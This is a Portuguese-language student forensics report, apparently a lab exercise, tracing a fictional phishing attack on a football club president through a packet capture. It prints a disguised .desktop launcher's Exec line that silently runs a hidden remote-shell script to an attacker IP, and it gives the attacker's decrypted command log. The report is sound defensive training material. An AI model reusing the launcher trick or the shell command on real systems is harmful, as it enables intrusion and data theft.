# Digital Forensic Report

## Authors 
 
<p align="justify"> 
	
	• André Proença • Ana Albuquerque • Joel Russo
</p>

---

## Appendix

1. [Digital Forensics Report](#digital-forensics-report);
2. [Estrutura da investigação](#estrutura-da-investigação);
3. [Artefatos de evidência](#artefatos-de-evidência);
4. [Ferramentas externas usadas para análise da captura e obtenção de provas](#ferramentas-externas-usadas-para-análise-da-captura-e-obtenção-de-provas);
5. [Provas descobertas](#provas-descobertas);
6. [Configuração do Wireshark para desencriptar tráfego HTTPS](#configuração-do-wireshark-para-desencriptar-tráfego-https);
7. [Análise da captura](#análise-da-captura);
8. [Itens auxiliares](#itens-auxiliares);

---

## Digital Forensics Report
 

**1. Do you find any evidence of transfers involving the documents in the analyzed network traces?
What can you tell about the authenticity of these documents?**

> <p align="justify"> 
> Sim, foram encontradas evidências dos documentos secretos no tráfego da rede.
> <p align="justify"> 
> Depois de feita a análise detalhada do tráfego, encontrámos o pacote 148936 que nos pareceu particularmente suspeito. Após a sua inspeção é possível verificar um email trocado entre 2 indivíduos: Levy F. Velluci, Presidente do clube e Frederick Balconies, administrador da rede do clube. 
> O conteúdo do email demonstra que Frederick Balconies pede feedback ao presidente sobre um suposto video panorâmico do estádio, para ser publicado nas redes sociais, uma vez que o vídeo precisa da autorização do presidente para a divulgação nos media.
> <p align="justify"> 
> Por razões de segurança, o falso Frederick pede alegadamente, que Levy Fran Velluci faça download do ficheiro na diretoria Downloads.
> O email é enviado com este hyperlink: https://1drv.ms/u/s!Aqo92bFDjwdDbK1QjQG_ob008dc em anexo. Trata-se de um hyperlink para a Google Drive que contém o zip red-hawks-video.zip.
> <p align="justify"> 
> Foi possível descobrir através do pacote 96946 que Abby criou uma conta falsa de hotmail (frederikbalconies@hotmail.com), de modo a fazer um ataque de phishing, isto é, enviando um email com malware para o presidente, fazendo-o acreditar que era de Frederick.
> <p align="justify"> 
> Abby ligou-se ao computador do presidente através deste zip que para além de conter o suposto vídeo panorâmico do clube, continha também um script com informações de connecção, encriptação e desencriptação de ficheiros. Com este script, Abby conseguiu aceder remotamente ao computador de Levy Fran Velucci e assim foi possivel procurar informações confidenciais e obter os ficheiros secretos. 
> <p align="justify"> 
> Para verificar a autenticidade dos ficheiros é necessário verificar se os MD5 dos documentos encontrados na pen do Mr.Daniels são iguais sos MD5 dos ficheiros que estão no computador do presidente. Se forem, significa que os documentos encontrados na pen do Mr.Daniels são os mesmos que estão no computador do presidente.
> Deste modo, é possível confirmar as suspeitas de corrupção da transferência do jogador, associados ao Presidente Levy Fran Velucci.
> <p align="justify"> 
> Vamos então comparar os MD5 da fase anterior (documentos encontrados na pen) com os documentos que estão no computador do Levy F. Velluci:
</p>

Tabela 1: MD5 gerados a partir dos ficheiros obtidos da pen.

| Artefacto                        | MD5                                 |
|:--------------------------------:|:-----------------------------------:|
| Bank_Statement.pdf               | 33bd1f8ed5f5692c5bf1e5a87d6110b2    | 
| Club_Statement.pdf               | e02839232a2283ac0843de8ecfc980a0    | 
| Club_Memo.pdf                    | f0882eedb95122f39e692a9397c1f5c5    |
| James_Santos_profile.pdf         | 44d015d11ecd0ec4ecaa6cb350032d17    |
| supporters_statement.pdf         | 2be65457105ca324381952538fc94de7    |


Tabela 2: MD5 gerados a partir dos ficheiros obtidos do computador do Sr.Valucci.

| Artefacto                         | MD5                                 | Número do pacote   |
|:---------------------------------:|:-----------------------------------:|:------------------:|
| Bank_Statement.pdf                | 33bd1f8ed5f5692c5bf1e5a87d6110b2    | 141113             |
| Club_Statement.pdf                | e02839232a2283ac0843de8ecfc980a0    | 140979             |
| Club_Memo.pdf                     | f0882eedb95122f39e692a9397c1f5c5    | 140670             |
| James_Santos_profile.pdf          | 44d015d11ecd0ec4ecaa6cb350032d17    | 142061             |
| Official_Supporters_Statement.pdf | 2be65457105ca324381952538fc94de7    | 140807             |


Confirma-se! Os MD5 values de todos os PDFs são iguais, provando-se assim a autenticidade dos documentos.

#

**2. What can you tell about the identity of the person(s) responsible for leaking the secrets?**

> <p align="justify"> 
> Tal como explicado na pergunta 1), verificámos que através de um ataque de phishing, a Abby conseguiu obter os ficheiros do computador de Levy Fran Velucci, enviando um zip contendo um script com código escondido para a connecção, encriptação e desencriptação de ficheiros para o mesmo, através de um email falso semelhante ao de frederick (frederikbalconies@hotmail.com).
> <p align="justify"> 
> Deste modo é possível constatar que a única responsável pela divulgação dos ficheiros secretos, foi a Abby.
</p>

#
              
**3. Can you establish a timeline of all relevant events that clarifies how the entire data exfiltration has
taken place and the secrets ended up in Charles Daniels’ computers?**

> <p align="justify">
> Na imagem abaixo, é possível observar uma representação gráfica dos acontecimentos. Foi possível traçar esta linha de acontecimentos, através das datas nos pacotes de tráfego analisados e das datas existentes no header dos cabeçalhos dos pedidos.
> <p align="justify"> 
> Quanto a como é que os ficheiros chegaram ao computador de Charles Daniels, não foi possível confirmar como foram enviados, visto que a captura do tráfego termina antes desse acontecimento. 	
</p>

![linha de tempo](timeline.png)

#

**4. What can you deduce from all the evidence collected in the context of the investigation? If the
investigation was to continue, what should be the next steps to verify your hypotheses?**
 
> <p align="justify"> 
>  Através da análise do trafego, foi possível confirmar a veracidade dos documentos publicados por Charles Daniels. Foi possível também descobrir todo o percurso até à obtenção dos mesmos, como o inicio de sessão no serviço login.live.com por Abby usando o email falso, o envio do malware para o computador do presidente, e o download dos 5 pdfs encontrados através da conexão estabelecida por Abby ao computador do Presidente.
> Foi descoberto que o Vice Presidente Ryan Coast, possivelmente também esteve envolvido na venda do jogador, através de emails, onde era pedido "500k chikens". Para os próximos passos da investigação seria importante verificar o motivo do pedido desta quantia de dinheiro ao Presidente Levy Fran Velucci e se existe ou não relação com a venda do jogador, visto que não foram encontradas provas da transferência, nem motivos para a mesma, no tráfego analisado.
</p>
	
---

## Estrutura da investigação

Organizámos a investigação por diretorias. 
Todas as provas descobertas são guardadas na diretoria `Evidences/`.
Todas as ferramentas usadas para a descobertas de provas (scripts, programas, etc...) são guardadas na diretoria `Tools/`.

**Visualização gráfica do ambiente de investigação:**
        
```
csf-lab3-artifacts
       └─── Evidences
		└─── 115877-celebration-email
		└─── 147162-chickens-email
		└─── 11390-computer-fix-email
		└─── 148936-panoramic-video
		└─── red-hawks-video.zip
		└─── abby-login-as-Frederick.post
		└─── Packages
			 └─── <numero_pacote>-cmd  (1)
			 └─── <numero_pacote>-file (1)
			 └─── <numero_pacote>-exec (1)
		└─── Packages-Decrypted
			  └─── <numero_pacote>-cmd.txt   (2)
			  └─── <numero_pacote>-file.pdf  (2)
			  └─── <numero_pacote>-exec.pdf  (2)
				
	└─── Tools
		└─── decrypt.py
		└─── decrypt_all.sh


	└─── capture.pcapng (3)
	└─── sslkeylogfile.txt (3)
	
	Nota (1): Vários ficheiros com este formato que representam os pacotes extraídos.
	Nota (2): Vários ficheiros com este formato que representam os pacotes desencriptados.
	Nota (3): Não estão incluídos no zip.

```        

---

## Artefatos de evidência

| Artefacto                        | MD5                                 | Descrição
|:---------------------------------:|:-----------------------------------:|:---------------------------------------------------------
| 115877-celebration-email          | 474e6bbb404f8691190e7d0ccaf78df9    | chat entre Levy Fran Velucci, Ryan Coast e George Sednem
| 147162-chickens-email             | 7466b27e90df162d383aa745b91ca046    | chat entre Levy Fran Velucci e Ryan Coast
| 148936-panoramic-video            | ba3bfc7b40febd48e0892ed8d4513450    | chat entre Levy Fran Velucci e Frederick Balconies
| 11390-computer-fix-email          | 997aa823b0ea3b74b8bf9c633a232053    | chat entre Levy Fran Velucci e Frederick Balconies
| red-hawks-video.zip               | ebea9f5572d6fb0873682f3b31c059d2    | zip contém video do estádio e malware
| Bank_Statement.pdf                | 33bd1f8ed5f5692c5bf1e5a87d6110b2    | conteúdo do pacote 141113
| Club_Statement.pdf                | e02839232a2283ac0843de8ecfc980a0    | conteúdo do pacote 140979             
| Club_Memo.pdf                     | f0882eedb95122f39e692a9397c1f5c5    | conteúdo do pacote 140670             
| James_Santos_profile.pdf          | 44d015d11ecd0ec4ecaa6cb350032d17    | conteúdo do pacote 142061             
| Official_Supporters_Statement.pdf | 2be65457105ca324381952538fc94de7    | conteúdo do pacote 140807

---

## Ferramentas externas usadas para análise da captura e obtenção de provas

 • `Wireshark` 

---

## Provas descobertas

| pacote                  | ficheiro				    
|:-----------------------:|:----------------------------------------------
| 115877                  | 115877-celebration-email   
| 147162                  | 147162-chickens-email
| 11390                   | 11390-computer-fix-email
| 148936                  | 148936-panoramic-video
| 114027                  | red-hawks-video.zip 
| 141113                  | Bank_Statement.pdf   
| 140979                  | Club_Statement.pdf   
| 140670                  | Club_Memo.pdf  
| 142061                  | James_Santos_profile.pdf  
| 140807                  | Supporters_Statement.pdf

---

## Configuração do Wireshark para desencriptar tráfego HTTPS

De modo a desencriptar o tráfego HTTPS interceptado pelo proxy, importámos o ficheiro `sslkeylogfile.txt` para o `Wireshark` da seguinte maneira:

No GUI do Wireshark carregar: `Edit` --> `Preferences` --> `Protocols`

<img width="700" alt="wireshark1" src="wireshark1.png">

Depois procurar em `Protocols` --> `TLS`. 

Na aba `(Pre)-Master-Secret log filename` --> `Browse` --> `sslkeylogfile.txt` --> `OK`

<img width="700" alt="wireshark2" src="wireshark2.png">

Após esta configuração, podemos então prosseguir para a análise da captura.

---

## Análise da captura

### 🔍 Análise detalhada da captura `capture.pcapng`

**Ferramenta**: `Wireshark`

Começámos por analisar e procurar conteúdo relacionado com os emails dos colaboradores do clube Red Hawks FC.

Emails:
- levyfvelucci@outlook.com
- ryancoast10@outlook.com
- frederickbalconies@hotmail.com
- chapmanabby1337@protonmail.com

Pesquisámos no Wireshark por: `Packet Details` : `Narrow & Wide` : `Strings` < email >

Pesquisando pelo email: levyfvelucci@outlook.com, encontrámos dentro de alguns pacotes os seguintes emails que nos pareceram suspeitos:

#

Inspecionámos o pacote 115877.
Este ficheiro está disponível em: `Evidences/115877-celebration-email`

```
Pacote: 115877

| ConversationTopic: Dinner celebration

| DateTimeReceived":"2021-10-30T10:59:54+01:00
| DateTimeCreated: 2021-10-30T10:59:54+01:00
| From: georgesednem@gmail.com
| 
| Hello fine gentlemen, How are you enjoying your cut from our chicken business deal? 
| It is now almost 2 months since we closed the deal and all the dust has settled. 
| Everybody has already forgotten about it, so I think it is time to celebrate. 
| What do you think.


| DateTimeReceived":"2021-10-30T11:11:14+01:00
| DateTimeCreated":"2021-10-30T11:10:11+01:00
| From: levyfvelucci@outlook.com
|
| Hello George, What an amazing deal that we were able to pull through! 
| This celebration is long overdue, I am in! If Ryan agrees, Solar do Presuntos sounds great. 
| LFV


| DateTimeReceived":"2021-10-30T14:18:48+01:00
| DateTimeCreated":"2021-10-30T14:18:48+01:00
| From: ryancoast10@outlook.com
|
| Hello George, Solar dos Presuntos is fine by me. 
| Ryan Coast


| DateTimeReceived":"2021-10-30T15:09:55+01:00
| DateTimeCreated":"2021-10-30T15:09:55+01:00
| From: georgesednem@gmail.com
| 
| Great! Dinner reservation tonight at 8 PM. Best regards, 
| George Sednem

Conversa de grupo entre: George Sednem, Levy F. Velluci e Ryan Coast

emails: georgesednem@gmail.com, levyfvelucci@outlook.com, ryancoast10@outlook.com
```
Após a análise deste email, percebemos que é trocado entre 3 indivíduos: Levy F. Velluci, Presidente do clube, Ryan Coast, Vice-Presidente do clube e George Sednem, agente do jogador James Santos. Está claro que o âmbito do email se trata de uma marcação de um jantar para celebrar o negócio da transferência do jogador James Santos. O Jantar teve lugar no restaurante **Solar dos Presuntos** dia 30/10/2021 às 8h da noite. 

Podemos notar ainda pelo tom da conversa que o negócio parece não ter sido completamente legal: 

```
"It is now almost 2 months since we closed the deal and all the dust has settled. 
Everybody has already forgotten about it"

George Sednem, agente do jogador James Santos.
```

```
"Hello George, What an amazing deal that we were able to pull through!"

Levy F. Velluci, Presidente do clube.
```

# 

Analisámos o pacote 147162.
Este ficheiro está disponível em: `Evidences/147162-chickens-email`

```
Pacote: 147162

| ConversationTopic: Where are my chickens?

| DateTimeReceived":"2021-10-30T11:20:11+01:00
| DateTimeCreated":"2021-10-30T11:20:11+01:00
| From: ryancoast10@outlook.com
| 
| Hi Levy, 
| Just following on that email that George just sent: I'm still waiting for my share... 
| We have discussed this far too many times already! 
| You got 3 million chickens out of that deal and you promised me 500 thousand to go along
| with it... You've had almost 2 months to send me my cut and I'm still waiting!
| If you want this dinner celebration to go through, you need to send me the chickens. 
| Otherwise, you may need to face some unexpected problems.
| Please send the chickens to my Bitcoin address, as it is safer:
| 19XjtE32nZpZSjtpcfYRGL9UBuDW8dRyAN
| Ryan Coast


| DateTimeReceived":"2021-10-30T11:33:26+01:00
| DateTimeCreated":"2021-10-30T11:32:57+01:00
| From: levyfvelucci@outlook.com
| 
| Easy Ryan, don't worry! Now that things have become calmer, I will send you your share of 
| the deal today. 
| I have already told you that I don't know how to use this bitcoin thing, so I'll just
| transfer it by the traditional way during my lunch break. I've heard these things are only 
| used by criminals and we surely aren't criminals, just simple businessmen trying to make a 
| living. It is not like we are going to get caught anyway.


| DateTimeReceived":"2021-10-30T14:13:28+01:00
| DateTimeCreated":"2021-10-30T14:13:28+01:00
| From: ryancoast10@outlook.com
| 
| Hi Levy, Just got confirmation on the 500k chickens. I would rather you had used BTC, but at 
| this point I just want my chickens. Everything is okay now. 
| Ryan Coast 


Conversa entre: Levy F. Velluci e Ryan Coast

emails: levyfvelucci@outlook.com e ryancoast10@outlook.com
```

Analisando este email, verificamos que é trocado entre 2 indivíduos: Levy F. Velluci, Presidente do clube e Ryan Coast, Vice-Presidente do clube, em que conversam sobre uma eventual falta de pagamento prometida por Levy F. Velluci a Ryan Coast a propósito da transferêcia do jogador James Santos.
É usado o termo `chickens` que acreditamos que signifique `euros`.

Ryan faz um ultimato a Levy F. Velluci, dizendo que se Levy F. Velluci não transferir os 500 mil euros para a sua conta, dos 3 milhões de euros que recebeu da transferência de James Santos, vai expôr a situação, e o jantar de celebração com o agente do jogador James Santos, George Sednem, não irá acontecer. 

Ryan pede explicitamente que o presidente faça a devida tranferência para a sua conta BitCoin. A transferência acaba por ser consumada no mesmo dia para a conta tradicional (não a conta de BitCoin) de Ryan Coast. Ryan Coast verifica e valida que recebeu o acordado, confirmando o jantar de celebração.

Conseguimos comprovar explicitamente que os indícios de corrupção se verificam, e que a transferência do jogador James Santos foi um negócio fraudulento, que beneficiou os 3 intervenientes do negócio: Levy F. Velluci, Ryan Coast e George Sednem.

Frases explícitas que indiciam ações criminosas: 

```
"I'm still waiting for my share... We have discussed this far too many times already! 
You got 3 million chickens out of that deal and you promised me 500 thousand to go along with it... 
You've had almost 2 months to send me my cut and I'm still waiting!"

Ryan Coast, Vice-Presidente do clube
```

```
"Easy Ryan, don't worry! Now that things have become calmer, I will send you your share of the deal today."

Levy F. Velluci, Presidente do clube.
```

```
"Hi Levy, Just got confirmation on the 500k chickens."

Ryan Coast, Vice-Presidente do clube
```

#

Analisámos o pacote 11390:
Este ficheiro está disponível em: `Evidences/11390-computer-fix-email`

```
Pacote: 11390

| ConversationTopic: Have you fixed the computer?

| DateTimeReceived":"2021-10-30T11:44:42+01:00
| DateTimeCreated":"2021-10-30T11:44:42+01:00
| From: levyfvelucci@outlook.com
| 
| Hello Frederick, Did you have time to fix my daugther's computer? 
| She has been complaining about it all week... Thank you! 
| LFV


| DateTimeReceived":"2021-10-30T11:57:40+01:00
| DateTimeCreated":"2021-10-30T11:57:40+01:00
| From: frederickbalconies@hotmail.com
| 
| Hello Mr. President, 
| I am not at the office right now but your daughter's computer will be ready later today, do 
| not worry. Best regards, 
| Frederick Balconies

Conversa entre: Frederick Balconies e Levy f Velluci

emails: frederickbalconies@hotmail.com e levyfvelucci@outlook.com
```

Este email trocado entre Levy F. Velluci e Frederick Balconies, pareceu-nos irrelevante para o contexto da investigação, no entanto acreditamos ser importante para entender a relação entre Levy F. Velucci e Frederick Balconies, que pelos vistos nos parece ser uma relação estritamente profissional.


#

Analisámos o pacote 148936.
Este ficheiro está disponível em: `Evidences/148936-panoramic-video`

```
Pacote: 148936

| ConversationTopic: Panoramic Video of Stadium

| DateTimeReceived":"2021-10-31T15:59:36Z
| DateTimeCreated":"2021-10-31T15:59:05Z
| From: frederickbalconies@hotmail.com

| Mr. President, The marketing team would like to publish a panoramic video of our stadium on social media. 
| Please provide some feedback, so I can tell them if they can do it or not.
| For safety reasons, please download and unzip the attachment file into the Downloads directory.
| Frederick Balconies

Conversa entre: Frederick Balconies e Levy f Velluci

emails: frederikbalconies@hotmail.com e levyfvelucci@outlook.com
```
Este email em particular, trocado entre 2 indivíduos: Levy F. Velluci, Presidente do clube e Frederick Balconies, administrador da rede do clube, parece à partida inofensivo, no entanto verificámos algo mais. Podemos notar a diferença de emails do Frederick entre os pacotes 11390 e 148936, em que o endereço que envia o email não é o mesmo. Isto é, alguém fazendo-se passar por Frederick enviou um email ao presidente com o video.

O falso Frederick Balconies pede feedback ao presidente sobre um suposto video panorâmico do estádio, para ser publicado nas redes sociais. O vídeo precisa da autorização do presidente para a divulgação nos media, e, por isso, o falso Frederick pede alegadamente, por razões de segurança, que Levy Fran Velluci faça o download do ficheiro na diretoria Downloads.

Parece um email completamente normal sobre assuntos relacionados com o clube, no entanto, se inspecionarmos o ficheiro enviado em anexo, verificamos que se trata de um hyperlink <https://1drv.ms/u/s!Aqo92bFDjwdDbK1QjQG_ob008dc> para o Google drive, com o intuito de descarregar um zip `red-hawks-video.zip`. Após o download é possível observar um ficheiro visível `Red Hawks`. Se analisarmos o seu source code, verificamos que se trata de um ficheiro `.desktop` e que executa instruções maliciosas. Percebemos também que existem duas diretorias escondidas: `.malware` que contém um ficheiro `shell.py` e `.video` que contém o video panorâmico do estádio `video.mp4`.

### 🔍 Abby cria um email falso para um ataque de phishing ao presidente

Foi possível descobrir que a Abby criou um email falso, semelhante ao email de frederick Balconies, de modo a fazer-se passar pelo mesmo.

O pedido POST encontra-se no pacote:

• 96946

Utilizou as seguintes credenciais para se fazer passar por Frederick Balconies:
```
login: `frederikbalconies@hotmail.com`  
passwd: `19#fcorruption#04`
```

Utilizando esta sessão Abby vai enviar malware para o computador do Presidente através de um email, fazendo-se passar por Frederick Balconies.

### 🔍 Descoberta de malware

Inspecionando o ficheiro `red-hawks.desktop`, que é visível pelo título de `Red Hawks`, percebemos que a instrução `Exec` faz três coisas. Abre o vídeo, instala a ferramenta `pycrypto` e executa o script `shell.py` com dois parametros, um ip e um porto, que pelos vistos são o ip e porto da abby (Chapman13).
```
Exec=sh -e -c "xdg-open /home/$(whoami)/Downloads/red-hawks-video/.video/video.mp4; 
pip install pycrypto; 
python3.6 /home/$(whoami)/Downloads/red-hawks-video/.malware/shell.py 192.168.122.93 1337"
```
O malware executado no computador do presidente, têm como objetivo dar acesso a Abby ao computador remoto do presidente.
Acreditamos que foi deste modo que Abby teve acesso aos documentos confidenciais que incriminam Levy Fran Velluci. 

Sabendo da ligação remota de Abby ao computador de Levy Fran Velucci, filtrámos o tráfego http no wireshark pelos ips das máquinas de ambos:
```
ip.addr eq 192.168.122.113 && ip.addr eq 192.168.122.93 && http
```
Desta análise, observamos pedidos GET e POST entre máquinas. Verificámos 17 respostas a GET requests do endereço de ip da Abby 192.168.122.93 para o endereço de ip do presidente 192.168.122.113 e 16 POST requests do endereço de ip do presidente para o endereço de ip da Abby, dos quais são enviados 5 ficheiros e 11 comandos encriptados com a ajuda do script malware `shell.py`.
Estes 5 ficheiros devem provar a autenticidade dos 5 ficheiros confidenciais descobertos anteriormente na pen drive que incriminam o presidente. 
Os 11 comandos provavelmente são bash outputs de comandos bash executados no computador do presidente. 
Os 17 pacotes, são respostas a GET requests, que acreditamos corresponderem aos comandos bash enviados por Abby para serem executados no terminal do computador do presidente. 

### 🔍 Extração dos ficheiros encriptados

Os 5 ficheiros encontram-se nos pacotes:

• 140670 • 140807 • 140979 • 141113 • 142061

Os 11 comandos encontram-se nos pacotes:

• 140409 • 140438 • 140464 • 140489 • 140518 • 140546 • 140576 • 140840 • 141006 • 141035 • 141160
	
As 17 respostas de GET requests encontram-se nos pacotes:

• 140401 • 140426 • 140452 • 140480 • 140508 • 140537 • 140568 • 140600 • 140709 • 140832 • 140872 • 140997 • 141026 • 141058 • 141151 • 141180 • 142047

O conteúdo dos pacotes é armazenado em ficheiros com o seguinte formato: 

- Se o conteúdo do pacote for um comando:
  numeroPacote-xec, por exemplo 140401-exec

- Se o conteúdo do pacote for o output de um comando:
  numeroPacote-cmd, por exemplo 140409-cmd
	
- Se o conteúdo do pacote for um ficheiro (pdf):
  numeroPacote-file, por exemplo 140670-file
  
O conteúdo destes pacotes foi guardado na diretoria **Evidences/Packages/** e foi extraído do `wireshark` da seguinte maneira:

`File --> Export Objects --> HTTP --> Selecionar os pacotes --> Save as`

### 🔍 Recuperação dos ficheiros encriptados

Estes ficheiros estão encriptados e para recuperarmos os seus estados originais, criámos um script: `decrypt.py` que é baseado no script malware `shell.py`.

Para desencriptar cada ficheiro executámos o seguinte comando:
```
python3 decrypt.py <ficheiro>

Exemplo: python3 decrypt.py 140409-cmd
Exemplo: python3 decrypt.py 140670-file
Exemplo: python3 decrypt.py 140401-exec
```
Este comando lê os ficheiros e desencripta-os guardado o seu conteúdo em ficheiros com o formato:
- Se o nome do ficheiro for: `numeroPacote-cmd`, será criado um ficheiro `numeroPacote-cmd.txt`.
- Se o nome do ficheiro for: `numeroPacote-file`, será criado um ficheiro `numeroPacote-file.pdf`.
- Se o nome do ficheiro for: `numeroPacote-exec`, será criado um ficheiro `numeroPacote-file.txt`.

Nota: Para gerar automaticamente todos os ficheiros desencriptados, correr na diretoria **Tools/decrypt_all.sh**.

Os 33 ficheiros são extraídos dos respetivos pacotes e guardados na diretoria **Evidences/Packages-Decrypted/**.

Nota: Para testar, apagar todo o conteúdo da diretoria: **Evidences/Packages-Decrypted/** e executar novamente: **Tools/decrypt_all.sh**

### 🔍 Análise da Sequência de ficheiros desencriptados

Observando a sequência de pacotes no `wireshark`, vamos tentar entender como a Abby obteu os ficheiros confidenciais:
 
### Sequencia de ficheiros desencriptados

```
Pacote: 140401
GET
Date: Sun, 31 Oct 2021 16:13:13 GMT
Conteúdo: 
------------
whoami
------------

POST
Ficheiro: 140409-cmd 
Conteúdo:
------------
levy-velucci
------------

Pacote: 140426
GET
Date: Sun, 31 Oct 2021 16:13:17 GMT
Conteúdo: 
------------
ls
------------

POST
Ficheiro: 140438-cmd 
Conteúdo:
------------
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
------------

Pacote: 140452
GET
Date: Sun, 31 Oct 2021 16:13:21 GMT
Conteúdo: 
------------
ls Documents
------------

POST
Ficheiro: 140464-cmd 
Conteúdo:
------------
BankStatements
ClubStatement.pdf
How to download movies.txt
James_Santos_profile.pdf
Maldives Trip Plan
Offshore Accounts
Prep Season 20-21
Prep Season 21-22
Tax Report
------------

Pacote: 140480
GET
Date: Sun, 31 Oct 2021 16:13:29 GMT
Conteúdo: 
------------
ls Downloads
------------

POST
Ficheiro: 140489-cmd 
Conteúdo:
------------
812.png
alternative
Aventador.png
club_memo.pdf
Huracan.png
R8.png
red-hawks-video
red-hawks-video.zip
SF90.png
supporters_memo.pdf
Taycan.png
------------

Pacote: 140508
GET
Date: Sun, 31 Oct 2021 16:13:37 GMT
Conteúdo: 
------------
ls Pictures
------------

POST
Ficheiro: 140518-cmd 
Conteúdo:
------------
Alexandra Daddario
Dubai Trip
Family
Football Memes
Margot Robbie
Scarlett Johansson
Season 20-21
Season 21-22
------------

Pacote: 140537
GET
Date: Sun, 31 Oct 2021 16:13:46 GMT
Conteúdo: 
------------
ls Videos
------------

POST
Ficheiro: 140546-cmd 
Conteúdo:
------------
007 No Time To Die.mp4
Dune.mp4
Marvel Eternals.mp4
------------

Pacote: 140568
GET
Date: Sun, 31 Oct 2021 16:13:59 GMT
Conteúdo: 
------------
ls Downloads
------------

POST
Ficheiro: 140576-cmd 
Conteúdo:
------------
812.png
alternative
Aventador.png
club_memo.pdf
Huracan.png
R8.png
red-hawks-video
red-hawks-video.zip
SF90.png
supporters_memo.pdf
Taycan.png
------------

Pacote: 140600
GET
Date: Sun, 31 Oct 2021 16:14:17 GMT
Conteúdo: 
------------
download_file Downloads/club_memo.pdf
------------

POST
Ficheiro: 140670-file 
Conteúdo: club_memo.pdf

Pacote: 140709
GET
Date: Sun, 31 Oct 2021 16:14:35 GMT
Conteúdo: 
------------
download_file Downloads/supporters_memo.pdf
------------

POST
Ficheiro: 140807-file  
Conteúdo: supporters_memo.pdf

Pacote: 140832
GET
Date: Sun, 31 Oct 2021 16:14:42 GMT
Conteúdo: 
------------
ls Documents
------------

POST
Ficheiro: 140840-cmd 
Conteúdo:
------------
BankStatements
ClubStatement.pdf
How to download movies.txt
James_Santos_profile.pdf
Maldives Trip Plan
Offshore Accounts
Prep Season 20-21
Prep Season 21-22
Tax Report
------------

Pacote: 140872
GET
Date: Sun, 31 Oct 2021 16:15:08 GMT
Conteúdo: 
------------
download_file Documents/ClubStatement.pdf
------------

POST
Ficheiro: 140979-file 
Conteúdo: ClubStatement.pdf

Pacote: 140997
GET
Date: Sun, 31 Oct 2021 16:15:20 GMT
Conteúdo: 
------------
ls Documents/BankStatements
------------

POST
Ficheiro: 141006-cmd 
Conteúdo:
------------
April
August
February
January
July
June
March
May
September
------------

Pacote: 141026
GET
Date: Sun, 31 Oct 2021 16:15:31 GMT
Conteúdo: 
------------
ls Documents/BankStatements/September
------------

POST
Ficheiro: 141035-cmd 
Conteúdo:
------------
bank_statement.pdf
------------

Pacote: 141051
GET
Date: Sun, 31 Oct 2021 16:15:46 GMT
Conteúdo: 
------------
download_file Documents/BankStatements/September/bank_statement.pdf
------------

POST
Ficheiro: 141113-file 
Conteúdo: bank_statement.pdf

Pacote: 141151
GET
Date: Sun, 31 Oct 2021 16:16:11 GMT
Conteúdo: 
------------
ls Documents
------------

POST
Ficheiro: 141160-cmd 
Conteúdo:
------------
BankStatements
ClubStatement.pdf
How to download movies.txt
James_Santos_profile.pdf
Maldives Trip Plan
Offshore Accounts
Prep Season 20-21
Prep Season 21-22
Tax Report
------------

Pacote: 141180
GET
Date: Sun, 31 Oct 2021 16:16:22 GMT
Conteúdo: 
------------
download_file Documents/James_Santos_profile.pdf
------------

POST
Ficheiro: 142061-file 
Conteúdo: James_Santos_profile.pdf

Pacote: 142047
GET
Date: Sun, 31 Oct 2021 16:16:41 GMT
Conteúdo: 
------------
exit
------------

```

Da análise, verificamos que Abby procurou exaustivamente em diferentes diretorias do computador de Levy Fran Velucci, por algo suspeito. 
Encontrou 5 pdfs confidenciais e enviou-os para ela. Abby termina a ligação ao computador do presidente com a instrução `exit`.
Deste modo obteve os ficheiros secretos e enviou-os posteriormente a Charlie.

#

### 🔍 Tentativa de aceder aos computadores do Presidente e Vice Presidente por ssh

Foi possível descobrir que a Abby tentou aceder aos computadores do presidente e vice presidente através do protocolo ssh. Esta tentativa não foi bem sucedida, não tendo assim, a Abby, obtido nenhuma informação relevante.

Estes acontecimentos podem ser visualisados por:
```
tshark -r capture.pcapng "ssh"
```

---

## Itens auxiliares

• `decrypt_all.sh`
Bash script que automatiza o processo de desencriptação dos ficheiros guardados em **Evidences/Packages/** Desencripta-os, e armazena os outputs na diretoria **Evidences/Packages-Decrypted/**
  
 **Modo de utilização:**
  ```bash
  bash decrypt_all.sh 
  ```
  
  • `decrypt.py`
Python script que dado um ficheiro encriptado pelo ficheiro de malware `shell.py`, desencripta-o, guardando o seu output em outro ficheiro.
  
 **Modo de utilização:**
  ```bash
  python3 decrypt.py <file_name> 
  ```
   ---
  
  <h4 align="center"> • Grupo 47 • Ana Albuquerque 102209 • André Proença 102327 • Joel Russo 102098 •
</h4>

 ---
